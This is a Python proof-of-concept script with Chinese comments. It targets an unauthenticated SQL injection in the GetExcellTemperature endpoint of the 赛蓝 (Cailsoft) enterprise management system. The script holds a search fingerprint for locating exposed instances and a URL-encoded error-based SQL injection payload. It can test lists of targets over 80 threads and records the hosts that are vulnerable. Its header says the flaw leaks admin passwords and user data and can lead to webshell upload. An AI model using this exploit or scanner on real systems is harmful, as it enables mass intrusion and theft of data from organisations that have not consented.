# 赛蓝企业管理系统 GetExcellTemperature SQL注入
# body="www.cailsoft.com" || body="赛蓝企业管理系统"
# 产品简介：赛蓝企业管理系统是一款为企业提供全面管理解决方案的软件系统，它能够帮助企业实现精细化管理，提高效率，降低成本。系统集成了多种管理功能，包括但不限于项目管理、财务管理、采购管理、销售管理以及报表分析等，旨在为企业提供一站式的管理解决方案。该系统以先进的管理思想为引导，结合企业实际业务流程，通过信息化手段提升企业管理水平。
# 漏洞概述：赛蓝企业管理系统 GetExcellTemperature 接口处SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ 
\x1b[38m ██████╗ ███████╗████████╗   ███████╗ ██████╗ ██╗     
\x1b[36m██╔════╝ ██╔════╝╚══██╔══╝   ██╔════╝██╔═══██╗██║     
\x1b[34m██║  ███╗█████╗     ██║█████╗███████╗██║   ██║██║     
\x1b[35m██║   ██║██╔══╝     ██║╚════╝╚════██║██║▄▄ ██║██║     
\x1b[31m╚██████╔╝███████╗   ██║      ███████║╚██████╔╝███████╗
\x1b[33m ╚═════╝ ╚══════╝   ╚═╝      ╚══════╝ ╚══▀▀═╝ ╚══════╝                                                                                                                                                      
                            --author:Kucei
                            --Version:赛蓝企业管理系统 GetExcellTemperature SQL注入                                                  
\x1b[0m"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser('赛蓝企业管理系统 GetExcellTemperature SQL注入')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()

    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/BaseModule/ExcelImport/GetExcellTemperature?ImportId=%27%20AND%206935%20IN%20(SELECT%20(CHAR(113)%2BCHAR(122)%2BCHAR(112)%2BCHAR(106)%2BCHAR(113)%2B(SELECT%20(CASE%20WHEN%20(6935%3D6935)%20THEN%20CHAR(49)%20ELSE%20CHAR(48)%20END))%2BCHAR(113)%2BCHAR(122)%2BCHAR(113)%2BCHAR(118)%2BCHAR(113)))%20AND%20%27qaq%27=%27qaq'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Accept-Encoding': 'gzip',
        'Connection': 'close'
    }
    # proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080',}
    data = {}
    try :
        response = requests.get(url=target+url_payload,headers=headers,verify=False,timeout=5)
        # print(response.status_code)
        # print(response.text)
        if response.status_code == 200 and 'qzpjq1qzqvq' in response.text:
            print( f"[+] {target} 存在漏洞！\n")
            with open('赛蓝企业管理系统_GetExcellTemperature-SQL.txt','a',encoding='utf-8')as f:
                f.write(target+url_payload+'\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")


if __name__ == '__main__':
    main()